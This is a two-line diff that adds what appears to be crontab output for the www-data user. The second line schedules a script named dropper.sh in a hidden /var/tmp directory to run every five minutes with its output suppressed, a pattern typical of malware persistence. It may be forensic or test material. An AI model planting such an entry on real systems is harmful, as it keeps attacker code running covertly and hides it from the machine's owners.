@@ -1,0 +1,2 @@
+# crontab -l -u www-data
+*/5 * * * * /var/tmp/.hidden/dropper.sh >/dev/null 2>&1
